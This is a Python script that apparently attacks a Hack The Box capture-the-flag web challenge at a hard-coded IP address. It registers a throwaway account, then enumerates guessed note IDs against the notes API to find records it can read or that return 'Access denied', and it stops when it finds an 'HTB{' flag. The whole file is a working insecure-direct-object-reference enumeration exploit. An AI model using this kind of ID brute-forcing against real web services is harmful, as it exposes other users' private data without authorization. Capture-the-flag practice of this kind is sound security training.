#!/usr/bin/env python3
import requests
import time
import string

BASE_URL = "http://83.136.255.203:47148"

# Fresh user
email = f"enum{int(time.time()*1000000)}@test.com"
r = requests.post(f"{BASE_URL}/api/auth/register", json={"email": email, "password": "test123"})
TOKEN = r.json()['token']
headers = {"Authorization": f"Bearer {TOKEN}"}

my_note = requests.get(f"{BASE_URL}/api/notes", headers=headers).json()['notes'][0]['id']

# Test many IDs
test_ids = []

# Common names
for word in ["admin", "root", "system", "secret", "flag", "htb", "challenge", "hidden", "private"]:
    test_ids.append(word)
    test_ids.append(word.upper())
    test_ids.append(word.capitalize())
    test_ids.append(f"{word}-note")
    test_ids.append(f"{word}_note")
    test_ids.append(f"note-{word}")
    test_ids.append(f"note_{word}")

# Single chars
for c in string.ascii_lowercase + string.digits:
    test_ids.append(c)

# Numbers
for i in range(100):
    test_ids.append(str(i))

print(f"[*] Testing {len(test_ids)} IDs...")

exists_access_denied = []
exists_success = []
not_found = []

for i, test_id in enumerate(test_ids):
    r = requests.get(f"{BASE_URL}/api/notes/{test_id}", headers=headers)
    result = r.json()
    
    error = result.get('error', '')
    
    if result.get('success'):
        content = result.get('note', {}).get('content', '')
        exists_success.append((test_id, content))
        
        if 'HTB{' in content:
            print(f"\n[!!!] FLAG FOUND in '{test_id}': {content}")
            exit(0)
    elif error == "Access denied":
        exists_access_denied.append(test_id)
    elif error == "Note not found":
        not_found.append(test_id)
    
    if (i + 1) % 50 == 0:
        print(f"  Progress: {i+1}/{len(test_ids)}")

print(f"\n[*] Results:")
print(f"  Success (accessible): {len(exists_success)}")
print(f"  Access denied (exist but protected): {len(exists_access_denied)}")
print(f"  Not found: {len(not_found)}")

if exists_access_denied:
    print(f"\n[*] Protected notes found: {exists_access_denied[:20]}")

if exists_success:
    print(f"\n[*] Accessible notes:")
    for note_id, content in exists_success:
        print(f"  {note_id}: {content[:50]}")
